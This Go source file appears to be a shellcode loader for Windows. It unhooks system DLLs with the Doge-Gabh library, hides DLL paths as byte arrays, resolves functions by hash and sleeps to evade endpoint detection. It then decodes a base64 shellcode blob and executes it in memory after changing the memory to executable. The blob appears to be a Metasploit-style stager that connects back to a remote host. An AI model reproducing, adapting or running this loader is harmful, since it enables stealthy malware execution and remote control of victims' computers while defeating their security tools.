// // LoadDLL 將 DLL 文件加載到內存中。 警告：使用沒有絕對路徑名的 LoadDLL 會受到
// // DLL 預加載攻擊。要安全地加載系統 DLL，請使用 LazyDLL
// MustLoadDLL 類似於 LoadDLL，但如果加載操作失敗，則會出現恐慌。
// NewLazyDLL 創建與 DLL 文件關聯的新 LazyDLL。
// NewLazySystemDLL is like NewLazyDLL, but will only search Windows System directory for the DLL if name is a base name (like "advapi32.dll").
// NewProc 返回一個 LazyProc，用於訪問 DLL 中的命名過程
package main

import (
	"crypto/sha1"
	"encoding/base64"
	"fmt"
	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"syscall"
	"unsafe"
)

const LARGE_NUMBER = 500000

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc") //https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
	VirtualProtect      = kernel32.NewProc("VirtualProtect")
	RtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const PAGE_READWRITE = 0x04

var b64sc = "/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgTTHJSA+3SkpIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJIi1IgQVGLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABWzwKhbgkFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V "

func sleep() {
	for i := 0; i <= LARGE_NUMBER; i++ {
		for j := 2; j <= i/2; j++ {
			if i%j == 0 {
				break
			}
		}
	}
}

func unhook() {

	dlls := []string{string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
		string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
	}
	gabh.FullUnhook(dlls)
	//sha1(sleep)=c3ca5f787365eae0dea86250e27d476406956478
	sleep_ptr, _, err := gabh.DiskFuncPtr("kernel32.dll", "c3ca5f787365eae0dea86250e27d476406956478", str2sha1)
	if err != nil {
		fmt.Println(err)
		return
	}
	syscall.Syscall(uintptr(sleep_ptr), 1, 3000, 0, 0)
	//NtDelayExecution
	sleep1, _, err := gabh.MemFuncPtr("ntdll.dll", "84804f99e2c7ab8aee611d256a085cf4879c4be8", str2sha1)
	if err != nil {
		fmt.Println(err)
		return
	}
	times := -(3000 * 10000)
	syscall.Syscall(uintptr(sleep1), 2, 0, uintptr(unsafe.Pointer(&times)), 0)

}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func main() {
	//sleep()
	unhook()
	sc, _ := base64.StdEncoding.DecodeString(b64sc)
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, PAGE_READWRITE) //傳回值就是分頁配置區域的基底位址。
	_, _, _ = RtlMoveMemory.Call(address, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(address, uintptr(len(sc)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	//cr, _, _ := CreateThread.Call(0, 0, address, 0, 0)
	//WaitForSingleObject.Call(cr, 0xFFFFFFFF)
	syscall.Syscall(address, 0, 0, 0, 0)
}
